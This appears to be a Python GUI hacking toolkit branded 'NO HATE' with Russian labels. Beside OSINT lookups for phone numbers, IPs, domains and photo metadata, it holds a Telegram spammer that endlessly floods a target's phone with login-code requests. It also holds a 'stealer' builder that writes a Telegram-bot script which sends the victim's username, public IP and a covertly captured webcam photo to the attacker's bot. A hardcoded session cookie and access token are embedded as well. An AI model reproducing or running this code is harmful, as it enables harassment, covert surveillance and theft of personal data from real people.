import customtkinter
from PIL import Image
from PIL.ExifTags import TAGS
from bs4 import BeautifulSoup
from socket import gethostbyname
from colorama import Fore, Style
import phonenumbers
import webbrowser
import requests
import random
import string
import time
import json
import os

user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Connection': 'keep-alive',
    'Cookie': '_ym_uid=1743693800673093604; _ym_d=1743693800; advcake_session_id=94e12719-1af4-2c9c-ec57-837430f33c79; u=f344a4b2-cabb-4bdb-9d4a-d7765580b7e8; UniqAnalyticsId=1743693800463252; _ga=GA1.1.1065975030.1743693814; _ym_isad=1; deduplication_cookie=admitad; tt_deduplication_cookie=adm; advcake_utm_partner=58; advcake_utm_webmaster=; advcake_click_id=; f=5.0c4f4b6d233fb90636b4dd61b04726f14f0aa6d4f7157ca44f0aa6d4f7157ca44f0aa6d4f7157ca44f0aa6d4f7157ca42668c76b1faaa3582668c76b1faaa3582668c76b1faaa3584f0aa6d4f7157ca402b7af2c19f2d05c02b7af2c19f2d05c0df103df0c26013a7b0d53c7afc06d0b2ebf3cb6fd35a0ac0df103df0c26013a8b1472fe2f9ba6b984dcacfe8ebe897bfa4d7ea84258c63d59c9621b2c0fa58f915ac1de0d034112f12b79bbb67ac37d46b8ae4e81acb9fae2415097439d40473de19da9ed218fe287829363e2d856a2e992ad2cc54b8aa8d99271d186dc1cd03de19da9ed218fe2d50b96489ab264ed3de19da9ed218fe23de19da9ed218fe246b8ae4e81acb9fa38e6a683f47425a8352c31daf983fa077a7b6c33f74d335c03d3f0af72d633b5fc94383d5daf636102c730c0109b9fbbe1ec3d9ea7bc811829513d3346850e0b0e28148569569b796adb37bd300d2382bf723510b84fca532ebf3cb6fd35a0ac0df103df0c26013a28a353c4323c7a3aefcfb0a8b111019595b8b4036410f6893de19da9ed218fe23de19da9ed218fe2b4af293ec419f67f6cd48844eb16d6d58edd6a0f40cbfd87da3d420d6cca468c; ft="XMmZx0+cwimnNj2U4HXGJ2eIroRBcQ0I8gOd2fiUu0Vh5HMHN4XT5xkQP3nqXNJ1WIZoveMHbzRQU9NkuXk9HTwgyxIL7hpN3UieDU4WAtSuTi/biPjn419gXzEia2U7uFB5GQ7mM7vC86gaHgHNQDMkJkiiQIGboPCc2pqS0DOXiTCdaxJaZ0/ub4CuQ640"; tagTagUid=768bce3ad74c91717f190fbe62c1b1c8; tagtag_aid=768bce3ad74c91717f190fbe62c1b1c8; advcake_track_id=122e5a93-265a-8d1e-894c-69fcae2a815d; auth_access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJTZXNzaW9uSWQiOjM1MTg4NTcxOCwiVXNlcklkIjpudWxsLCJBdXRoZW50aWNhdGVkIjpmYWxzZSwiRGV2aWNlSWQiOm51bGwsImlzcyI6ImF1dG90ZWthLXBhc3Nwb3J0IiwiZXhwIjoxNzQ0MDQxMzM5LCJpYXQiOjE3NDQwMzk1Mzl9.of-DkGKselYKKKF8L9VFpvcscCzGi0PU1gvZ4uYrUwFk6dWSRucqMzi35tEx1mMEwu_7huhnVIL9mHE_naL25s02jMiwj-fUR9vSEwqlGF14cIDmqQW5k9YpRPJiAd0opsD2zSHrTkHKk6sbiUNFg4N2fbr88QkoOvki8ieJ1pRnZTyEEedR0q_2e7vf7TX-7hSCbZnJmNtFsKtJVq_Ht8VLAxElrr1pQlgELW3B4_Cot1C-IA7-2a2HjAU4H9sXIXSrqvGqWiuDkUpczO1vQ9eujZ9cRD_roC3jO2dnIm3m8EF9b6Slikp9-gOFHVGtwmjszPkRViKQlh-MgnTVFw; advcake_track_url=%3D20250113Zh2VHGPgAgJGds1kPdMToTsQ72oA%2Fqon5jbFjwPVN%2BGI4DK9aXwzSprXVMFpP9iX5dYLc9IyOie8X2ddEL%2FAy2vXsbGxHgqlnI6Ee3glJ8kbswHHk2U9JUd6qvrtlFa4I3Fss5Bh1N3f%2FE4YWswTJS%2FkEonHwHU5nIMA8s5abVYIAO1asNoJdpoeC8szn4w59gFdGaHN5dbeVrzU%2FsbOG9Egk6LIp3u51aotEFgvQ9KAABWd1xmOQbqmrJriPjkRMM0a93OoHB4DIgg97NVsAxqimFWxB21wewdVJ7uuR5Y0Wdnr%2FoTAKn5SkhujQYgt13f%2FAa8qQqd5qH2MIuiKj8VNoP0%2FZw0HYQPaR4xfwQM383BOtmtQYPgYzz6QbMscspSo502toZqRMrRw7kVaMZucXzR%2FODFRYgDVzm81XFjmebDhc92lhDuXMMAQ%2BR9SEApRLhUIZtOT9xK%2BGZSdBmYqV64iLuk7%2B%2B%2BGcGQQbih7bSnDMdRgOr3sJgGDhY%2FXSNN5NjZbGTwnc%2FzZaCl5xpqk18138xTU36CTpOy22el97G6IGWrmulNxkElagc1hTcfYPTf%2B5tuCvPKrqmdZeq66w2tucR4m6K1Mdydu2NLtStLV9z7NepEiZKhIRJmRCkGljhKDdT3SBrABc2PVnkz8I1iQ6EGqYtR4OGBBjsyvNpBziuDW9xY%3D; _ga_R1J00DTZKD=GS1.1.1744039547.5.1.1744039560.0.0.0',
    'Upgrade-Insecure-Requests': '1'
}

base_phone = {}
base_ip = {}
base_site = {}
base_photo = {}

#function's
def search_phone(phone: str):
    ephone = phone[1:]
    url = f"https://fincalculator.ru/api/tel/{phone}"
    mnp = f"https://xn----dtbofgvdd5ah.xn--p1ai/php/mnp.php?nomer={phone}"
    response = requests.get(url, headers={'User-Agent': user_agent})
    mnp_rep = requests.get(mnp, headers={'User-Agent': user_agent})
    data = json.loads(response.text)

    oper = data["operator"] if data["operator"] != "" else "Не найдено"
    if mnp_rep.text != "﻿no":
        oper = oper + " был перенесён на " + mnp_rep.text

    parsed_number = phonenumbers.parse(phone)

    if phonenumbers.number_type(parsed_number) == 1:
        Type = "Мобильный"
    else:
        Type = "Стационарный"

    base = {
        "Query": phone,
        "Country": data["country"] if data["country"] != "" else "Не найдено",
        "Region": data["region"] if data["region"] != "" else "Не найдено",
        "City": data["subRegion"] if data["subRegion"] != "" else "Не найдено",
        "Oper": oper,
        "Type": Type
    }

    global base_phone
    base_phone = base

    return base

def search_ip(ip: str):
    url = f"https://ipinfo.io/{ip}/json"
    response = requests.get(url, headers={'User-Agent': user_agent})
    data = response.json()

    base = {
        "Query": ip,
        "Country": data.get('country', "Не найдено"),
        "Region": data.get('region', "Не найдено"),
        "City": data.get('city', "Не найдено"),
        "Org": data.get('org', "Не найдено"),
    }

    global base_ip
    base_ip = base

    return base

def info_site(domen: str):
    ip = gethostbyname(domen.split('/')[2]) if '/' in domen else gethostbyname(domen)

    base = {
        "Query": domen,
        "IP": ip,
    }

    global base_site
    base_site = base

    return base

def info_photo(path: str):
    tags_to_retrieve=['Model', 'DateTime']

    dataMODEL = "None"
    dataDT = "None"

    image = Image.open(path)
    exifdata = image.getexif()

    metadata = {}
    for tag_id, value in exifdata.items():
        tag = TAGS.get(tag_id, tag_id)
        if tags_to_retrieve is None or tag in tags_to_retrieve:
            if isinstance(value, bytes):
                value = value.decode()
            metadata[tag] = value

    for tag, value in metadata.items():
        if tag == "Model":
            dataMODEL = value

        if tag == "DateTime":
            dataDT = value

    base = {
        "Query": path,
        "Device": dataMODEL,
        "Date-Time": dataDT
    }

    global base_photo
    base_photo = base

    return base

def spam_tg(phone: str):
    urls = [
        'https://translations.telegram.org/auth/request',
        'https://my.telegram.org/auth/send_password',
        'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
        'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
        'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
        'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
        'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&return_to=https%3A%%2Fbot-t.com%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
        'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
        'https://oauth.telegram.org/auth/request?bot_id=5082101769&origin=https%3A%2F%2Fauth.smartbotpro.ru&request_access=write&lang=ru&return_to=https%3A%2F%2Fauth.smartbotpro.ru%2Fauth%2Flogin%2F',
        'https://oauth.telegram.org/auth/request?bot_id=366357143&origin=https%3A%2F%2Fwww.botobot.ru&embed=1&request_access=write&lang=ru&return_to=https%3A%2F%2Fwww.botobot.ru%2Fblog%2Fru%2Fvoiti-cherez-telegram-avtorizatsiia-na-saitie-botobot%2F'
    ]

    while True:
        for url in urls:
            requests.post(url, headers={'User-Agent': user_agent}, data={'phone': phone})
            time.sleep(0.5)

def stealler_build(token: str):
    code = f"""
    from telebot import types
    import requests
    import telebot
    import cv2
    import os

    bot = telebot.TeleBot('{token}')

    def get_public_ip():
        try:
            response = requests.get("https://api64.ipify.org?format=json")
            response.raise_for_status()
            return response.json()["ip"]
        except Exception as e:
            return "Не удалось получить IP"

    @bot.message_handler(commands=['start'])
    def start_command(message):
        bot.send_message(message.chat.id, f"Name: {os.getlogin()}\nIP: {get_public_ip()}")
        try:
            filename = "cam.jpg"
            cap = cv2.VideoCapture(0)

            for i in range(30):
                cap.read()

            ret, frame = cap.read()

            cv2.imwrite(filename, frame)
            cap.release()

            with open(filename, "rb") as img:
                bot.send_photo(message.chat.id, img)

            os.remove(filename)
        except:
            bot.send_message(message.chat.id, f"[ERROR] webcam not found")

    bot.polling()
    """

    with open('stealer.py', 'w') as file:
        file.write(code)

#Menu
def phone():
    phone = customtkinter.CTk()
    phone.geometry("340x350")
    phone.title("NO HATE | INFO BY PHONE")

    def clear():
        global base_phone
        base_phone = None
        phone.destroy()

    phone.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=phone, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=phone, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = search_phone(entry.get())
        out = f"""
                    [INF] Геолакацация
                      ┠ Страна: {info["Country"]}
                      ┠ Регион: {info["Region"]}
                      ┗ Город: {info["City"]}

                    [INF] Обслуживание
                      ┠ Оператор: {info["Oper"]}
                      ┗ Тип номера: {info["Type"]}
        """
        textbox.insert(f"0.0", out)

    button = customtkinter.CTkButton(master=phone, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    phone.mainloop()

def ip():
    ip = customtkinter.CTk()
    ip.geometry("340x350")
    ip.title("NO HATE | INFO BY IP")

    def clear():
        global base_ip
        base_ip = None
        ip.destroy()

    ip.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=ip, placeholder_text="IP...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=ip, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = search_ip(entry.get())
        out = f"""
                    [INF] Геолакацация
                      ┠ Страна: {info["Country"]}
                      ┠ Регион: {info["Region"]}
                      ┗ Город: {info["City"]}

                    [INF] Провайдер
                      ┗ Провайдер: {info["Org"]}
        """
        textbox.insert(f"0.0", out)

    button = customtkinter.CTkButton(master=ip, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    ip.mainloop()

def site():
    site = customtkinter.CTk()
    site.geometry("340x350")
    site.title("NO HATE | INFO BY SITE")

    def clear():
        global base_site
        base_site = None
        site.destroy()

    site.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=site, placeholder_text="example.com...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=site, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = info_site(entry.get())
        textbox.insert(f"0.0", f'IP: {info["IP"]}')

    button = customtkinter.CTkButton(master=site, text="Search", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    site.mainloop()

def photo():
    photo = customtkinter.CTk()
    photo.geometry("340x350")
    photo.title("NO HATE | INFO BY PHOTO")

    def clear():
        global base_photo
        base_photo = None
        photo.destroy()

    photo.protocol("WM_DELETE_WINDOW", clear)

    entry = customtkinter.CTkEntry(master=photo, placeholder_text="Photo path...")
    entry.place(x=170, y=230, anchor=customtkinter.CENTER)

    textbox = customtkinter.CTkTextbox(master=photo, width=350, corner_radius=0)
    textbox.place(x=175, y=100, anchor=customtkinter.CENTER)

    def one():
        textbox.delete(0.0, 'end')
        info = info_photo(entry.get())
        out = f"""
                    [INF] Устройство
                      ┗Страна: {info["Device"]}

                    [INF] Времемя
                      ┗ Дата и время: {info["Date-Time"]}
        """
        textbox.insert(f"0.0", out)

    button = customtkinter.CTkButton(master=photo, text="Get MetaData", command=one)
    button.place(x=170, y=260, anchor=customtkinter.CENTER)

    photo.mainloop()

def tg():
    spam = customtkinter.CTk()
    spam.geometry("400x300")
    spam.title("NO HATE | TELEGRAM SPAMMER")

    entry = customtkinter.CTkEntry(master=spam, placeholder_text="+7XXXXXXXXXX")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)

    def one():
        spam_tg(entry.get())

    button = customtkinter.CTkButton(master=spam, text="Apply", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)

    spam.mainloop()

def stealler():
    st = customtkinter.CTk()
    st.geometry("400x300")
    st.title("NO HATE | STEALLER BUILDER")

    entry = customtkinter.CTkEntry(master=st, placeholder_text="00000:ABCDEFGHI...")
    entry.place(x=200, y=110, anchor=customtkinter.CENTER)

    def one():
        pass

    button = customtkinter.CTkButton(master=st, text="Build", command=one)
    button.place(x=200, y=140, anchor=customtkinter.CENTER)

    st.mainloop()

def report():
    html = """
    <!DOCTYPE html>
    <html lang="ru">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
        <title>NO_HATE | Report</title>
        <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

        <svg style="display:none;">
            <symbol id="logo-icon" viewBox="0 0 24 24">
                <path d="M12 0C8.27 0 5.14 2.55 4.25 6c-.07.3-.12.61-.15.93A9.08 9.08 0 0 0 2 12c0 5.52 4.48 10 10 10s10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8 0-1.85.63-3.55 1.69-4.9L16.9 18.3A7.902 7.902 0 0 1 12 20zm6.31-3.1L7.1 5.69A7.902 7.902 0 0 1 12 4c4.41 0 8 3.59 8 8 0 1.85-.63 3.55-1.69 4.9z"/>
            </symbol>
            <symbol id="copy-icon" viewBox="0 0 24 24"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></symbol>
            <symbol id="arrow-up" viewBox="0 0 24 24"><path fill="currentColor" d="M13 20h-2V8.83L8.41 11.4 7 10l5-5 5 5-1.41 1.4L13 8.83V20z"/></symbol>
        </svg>

        <style>
            :root {
                --primary: #6366f1;
                --secondary: #8b5cf6;
                --accent: #ec4899;
                --background: #0f172a;
                --surface: #1e293b;
                --text: #f8fafc;
                --text-secondary: #94a3b8;
            }

            * {
                box-sizing: border-box;
                margin: 0;
                padding: 0;
            }

            body {
                font-family: 'Inter', system-ui, -apple-system, sans-serif;
                background: var(--background);
                color: var(--text);
                line-height: 1.5;
                padding: 1rem;
                min-height: 100vh;
            }

            .container {
                max-width: 1200px;
                margin: 0 auto;
                position: relative;
                padding-bottom: 2rem;
            }

            .corner-logo {
                position: absolute;
                top: 1rem;
                right: 1rem;
                display: flex;
                align-items: center;
                gap: 0.5rem;
                color: var(--text);
                text-decoration: none;
                z-index: 100;
            }

            .logo-icon {
                width: 32px;
                height: 32px;
                fill: currentColor;
                transition: transform 0.2s;
            }

            .logo-text {
                font-weight: 700;
                font-size: 1.25rem;
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
            }

            .stats-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
                gap: 1.5rem;
                margin: 2rem 0;
            }

            .stat-card {
                background: var(--surface);
                padding: 1.5rem;
                border-radius: 1rem;
                border-left: 4px solid var(--primary);
                box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1);
            }

            .leak-card {
                background: var(--surface);
                border-radius: 1rem;
                padding: 1.5rem;
                margin-bottom: 1.5rem;
                border: 1px solid rgba(255,255,255,0.1);
                transition: transform 0.2s;
            }

            .leak-card:hover {
                transform: translateY(-2px);
            }

            .leak-header {
                display: flex;
                align-items: center;
                gap: 1rem;
                margin-bottom: 1.5rem;
            }

            .source-badge {
                background: linear-gradient(45deg, var(--primary), var(--secondary));
                color: white;
                padding: 0.25rem 0.75rem;
                border-radius: 0.5rem;
                font-size: 0.875rem;
                font-weight: 500;
            }

            .data-grid {
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
                gap: 1rem;
            }

            .data-item {
                background: rgba(255,255,255,0.05);
                padding: 1rem;
                border-radius: 0.75rem;
                position: relative;
                overflow: hidden;
            }

            .copy-btn:hover {
                background: var(--primary);
                box-shadow: 0 2px 8px -1px var(--primary);
            }

            .scroll-top {
                position: fixed;
                bottom: -60px;
                right: 20px;
                width: 44px;
                height: 44px;
                background: var(--primary);
                color: white;
                border: none;
                border-radius: 50%;
                cursor: pointer;
                opacity: 0;
                transition: all 0.3s ease;
                display: flex;
                align-items: center;
                justify-content: center;
                box-shadow: 0 4px 12px rgba(99, 102, 241, 0.25);
                z-index: 1000;
            }

            .scroll-top.visible {
                bottom: 20px;
                opacity: 1;
            }

            .scroll-top:hover {
                transform: translateY(-2px) scale(1.05);
                background: var(--secondary);
            }

            @media (max-width: 768px) {
                .container {
                    padding: 0 0.5rem;
                }

                .leak-header {
                    flex-wrap: wrap;
                }

                .data-grid {
                    grid-template-columns: 1fr;
                }

                .corner-logo {
                    position: static;
                    justify-content: center;
                    margin-bottom: 1.5rem;
                }

                .scroll-top {
                    right: 10px;
                    bottom: -60px;
                    width: 40px;
                    height: 40px;
                }

                .scroll-top.visible {
                    bottom: 70px;
                }
            }

            .fade-in {
                animation: fadeIn 0.3s ease-in;
            }

            @keyframes fadeIn {
                from { opacity: 0; transform: translateY(10px); }
                to { opacity: 1; transform: translateY(0); }
            }
        </style>
    </head>
    <body>
    """

    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY PHONE  |  Запрос: {base_phone["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <h2 style="margin-top: 0px;">Геолокация</h2>
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_phone["Country"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_phone["Region"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🏘Город
                    </div>
                    <div style="word-break: break-word;">{base_phone["City"]}</div>

                    <h2 style="margin-top: 2rem;">Обслуживание</h2>
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Оператор
                    </div>
                    <div style="word-break: break-word;">{base_phone["Oper"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🔗Тип
                    </div>
                    <div style="word-break: break-word;">Мобильный</div>
                </div>
            </div>
        </div>
        </div></div>"""
    except:
        pass

    try:
        html += f"""
        <div class="leak-card fade-in">
            <div class="leak-header">
                <span class="source-badge">INFO BY IP  |  Запрос: {base_ip["Query"]}</span>
            </div>
            <div class="data-grid">
        <div class="data-item">
                <div style="margin-bottom: 0.5rem;">
                    <h2 style="margin-top: 0px;">Геолокация</h2>
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌏Страна
                    </div>
                    <div style="word-break: break-word;">{base_ip["Country"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🌲Регион
                    </div>
                    <div style="word-break: break-word;">{base_ip["Region"]}</div>

                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🏘Город
                    </div>
                    <div style="word-break: break-word;">{base_ip["City"]}</div>

                    <h2 style="margin-top: 2rem;">Обслуживание</h2>
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    👤Провайдер
                    </div>
                    <div style="word-break: break-word;">{base_ip["Org"]}</div>
                </div>
            </div>
        </div></div>
        """
    except:
        pass

    try:
        html += f"""
        <div class="leak-card fade-in">
        <div class="leak-header">
            <span class="source-badge">INFO BY SITE  |  Запрос: {base_site["Query"]}</span>
        </div>
            <div class="data-grid">
                <div class="data-item">
                    <div style="margin-bottom: 0.5rem;">
                        <div style="color: var(--text-secondary); font-size: 0.875rem;">
                        🌐IP
                        </div>
                        <div style="word-break: break-word;">{base_site["IP"]}</div>
                        </div>
                    </div>
                </div>
                </div></div>
         """
    except:
        pass

    try:
        html += fr"""
        <div class="leak-card fade-in">
        <div class="leak-header">
            <span class="source-badge">MetaData by Photo  |  Запрос: {base_photo["Query"]}</span>
        </div>
            <div class="data-grid">
                <div class="data-item">
                    <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    📱Устройство
                    </div>
                    <div style="word-break: break-word;">{base_photo["Device"]}</div>

                    <div style="margin-bottom: 0.5rem;">
                    <div style="color: var(--text-secondary); font-size: 0.875rem;">
                    🕗Дата и время
                    </div>
                    <div style="word-break: break-word;">{base_photo["Date-Time"]}</div>
                </div>
            </div>
        </div>
        </div></div>
        """
    except:
        pass

    html += """
        <button class="scroll-top" aria-label="Прокрутить вверх">
            <svg style="width:24px;height:24px;"><use href="#arrow-up"/></svg>
        </button>
            <script>
                // Скрипт для кнопки прокрутки
                const scrollBtn = document.querySelector('.scroll-top');

                window.addEventListener('scroll', () => {
                        if (window.scrollY > 500) {
                            scrollBtn.classList.add('visible');
                        } else {
                            scrollBtn.classList.remove('visible');
                        }
                    });

                    scrollBtn.addEventListener('click', () => {
                        window.scrollTo({
                            top: 0,
                            behavior: 'smooth'
                        });
                    });

                    // Адаптация для мобильных устройств
                    function updateVH() {
                        document.documentElement.style.setProperty('--vh', window.innerHeight * 0.01 + 'px');
                    }
                    updateVH();
                    window.addEventListener('resize', updateVH);
                    </script>
                </body>
            </html>
            """
    with open('report.html', 'w', encoding='utf-8') as file:
        file.write(html)

    webbrowser.open('report.html')

customtkinter.set_appearance_mode("dark")  # Modes: "System" (standard), "Dark", "Light"
customtkinter.set_default_color_theme("dark-blue")  # Themes: "blue" (standard), "green", "dark-blue"

app = customtkinter.CTk()
app.geometry("400x480")
app.title("NO HATE | TOOL")

label = customtkinter.CTkLabel(app, text="Osint", fg_color="transparent")
label.place(x=200, y=80, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By Phone", command=phone)
button.place(x=200, y=110, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search By IP", command=ip)
button.place(x=200, y=140, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Search by Site", command=site)
button.place(x=200, y=170, anchor=customtkinter.CENTER)

label = customtkinter.CTkLabel(app, text="Tools", fg_color="transparent")
label.place(x=200, y=210, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="MD by Photo", command=photo)
button.place(x=200, y=240, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Spam TG", command=tg)
button.place(x=200, y=270, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Stealler", command=stealler)
button.place(x=200, y=300, anchor=customtkinter.CENTER)

label = customtkinter.CTkLabel(app, text="Settings", fg_color="transparent")
label.place(x=200, y=340, anchor=customtkinter.CENTER)

button = customtkinter.CTkButton(master=app, text="Create report", command=report)
button.place(x=200, y=370, anchor=customtkinter.CENTER)
app.mainloop()
